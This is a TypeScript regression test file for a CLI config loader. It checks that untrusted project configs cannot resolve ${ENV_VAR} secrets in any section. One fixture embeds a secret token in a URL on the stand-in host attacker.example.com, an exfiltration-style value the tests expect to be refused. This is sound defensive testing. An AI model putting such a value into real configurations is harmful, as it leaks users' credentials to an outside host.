import test from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import os from "node:os";
import fs from "fs-extra";
import { loadConfig } from "../src/config/ConfigLoader.ts";
import { trustConfig } from "../src/config/TrustStore.ts";

/**
 * Regression coverage for the trust-check scope gap fixed alongside PR #11's
 * hardening: the check used to scan only "profiles" and "project.profile"
 * for a `{command: ...}` or `${ENV_VAR}` reference, while resolveReferences()
 * resolves the *entire* merged config. A `${ENV_VAR}` reference tucked into
 * e.g. `defaults.themeRepo` — a value that later gets fed straight into
 * `git clone` — resolved silently, with no trust prompt, from a config an
 * untrusted cloned repository controls. See IMPLEMENTATION-PLAN.md phase 1a.
 */

async function setup() {
  const cwd = await fs.mkdtemp(path.join(os.tmpdir(), "acli-trust-scope-cwd-"));
  const configHome = await fs.mkdtemp(path.join(os.tmpdir(), "acli-trust-scope-home-"));
  const projectConfigPath = path.join(cwd, ".acli", "config.yaml");
  await fs.ensureDir(path.dirname(projectConfigPath));
  const env = { ...process.env, ACLI_CONFIG_HOME: configHome };
  return { cwd, configHome, projectConfigPath, env };
}

async function teardown({ cwd, configHome }: { cwd: string; configHome: string }) {
  await fs.remove(cwd);
  await fs.remove(configHome);
}

test("loadConfig refuses an untrusted ${ENV_VAR} reference hidden in defaults (previously unscanned)", async () => {
  const ctx = await setup();
  const yaml = `version: 1\ndefaults:\n  themeRepo: "https://attacker.example.com/\${SECRET_TOKEN}"\n`;
  await fs.writeFile(ctx.projectConfigPath, yaml);

  await assert.rejects(
    () => loadConfig({ cwd: ctx.cwd, env: { ...ctx.env, SECRET_TOKEN: "ghp_SUPERSECRET" } }),
    /Refusing to resolve secrets.*defaults\.themeRepo/s,
  );

  await trustConfig(ctx.projectConfigPath, yaml, ctx.env);
  const trusted = await loadConfig({ cwd: ctx.cwd, env: { ...ctx.env, SECRET_TOKEN: "ghp_SUPERSECRET" } });
  assert.equal(trusted.config.defaults!.themeRepo, "https://attacker.example.com/ghp_SUPERSECRET");

  await teardown(ctx);
});

test("loadConfig refuses an untrusted ${ENV_VAR} reference hidden in a named preset (previously unscanned)", async () => {
  const ctx = await setup();
  const yaml = `version: 1\npresets:\n  demo:\n    themeBranch: "\${SECRET_TOKEN}"\n`;
  await fs.writeFile(ctx.projectConfigPath, yaml);

  await assert.rejects(
    () => loadConfig({ cwd: ctx.cwd, env: { ...ctx.env, SECRET_TOKEN: "leaked" } }),
    /Refusing to resolve secrets.*presets\.demo\.themeBranch/s,
  );

  await teardown(ctx);
});

test("loadConfig refuses an untrusted ${ENV_VAR} reference in project.name / project.environment (previously unscanned — only project.profile was checked)", async () => {
  const ctx = await setup();
  const yaml = `version: 1\nproject:\n  name: "\${SECRET_TOKEN}"\n  environment: docker\n`;
  await fs.writeFile(ctx.projectConfigPath, yaml);

  await assert.rejects(
    () => loadConfig({ cwd: ctx.cwd, env: { ...ctx.env, SECRET_TOKEN: "leaked" } }),
    /Refusing to resolve secrets.*project\.name/s,
  );

  await teardown(ctx);
});

test("loadConfig still enforces the check for project.profile (the original, narrower scope)", async () => {
  const ctx = await setup();
  const yaml = `version: 1\nproject:\n  name: demo\n  environment: docker\n  profile:\n    type: wordpress\n    ssh:\n      host: "\${SECRET_TOKEN}"\n      username: u\n    remote:\n      projectRoot: /r\n      wordpressRoot: w\n    database:\n      driver: wp-cli\n`;
  await fs.writeFile(ctx.projectConfigPath, yaml);

  await assert.rejects(
    () => loadConfig({ cwd: ctx.cwd, env: { ...ctx.env, SECRET_TOKEN: "leaked" } }),
    /Refusing to resolve secrets.*project\.profile\.ssh\.host/s,
  );

  await teardown(ctx);
});

test("an explicit --config file is never subject to the trust check, regardless of what it references", async () => {
  const ctx = await setup();
  const explicitPath = path.join(ctx.cwd, "portable.yaml");
  await fs.writeFile(explicitPath, `version: 1\ndefaults:\n  themeRepo: "\${SECRET_TOKEN}"\n`);

  const result = await loadConfig({ cwd: ctx.cwd, configPath: "portable.yaml", env: { ...ctx.env, SECRET_TOKEN: "not-a-problem-here" } });
  assert.equal(result.config.defaults!.themeRepo, "not-a-problem-here");

  await teardown(ctx);
});

test("resolveSecrets: false never triggers the check, matching `config validate`/`show` without --resolved", async () => {
  const ctx = await setup();
  const yaml = `version: 1\ndefaults:\n  themeRepo: "\${SECRET_TOKEN}"\n`;
  await fs.writeFile(ctx.projectConfigPath, yaml);

  const unresolved = await loadConfig({ cwd: ctx.cwd, env: ctx.env, resolveSecrets: false });
  assert.equal(unresolved.rawConfig.defaults!.themeRepo, "${SECRET_TOKEN}");

  await teardown(ctx);
});

test("ACLI_TRUST_PROJECT_CONFIG=1 bypasses the widened check for a single run, same as before", async () => {
  const ctx = await setup();
  const yaml = `version: 1\ndefaults:\n  themeRepo: "\${SECRET_TOKEN}"\n`;
  await fs.writeFile(ctx.projectConfigPath, yaml);

  const bypassed = await loadConfig({ cwd: ctx.cwd, env: { ...ctx.env, SECRET_TOKEN: "leaked", ACLI_TRUST_PROJECT_CONFIG: "1" } });
  assert.equal(bypassed.config.defaults!.themeRepo, "leaked");

  await teardown(ctx);
});
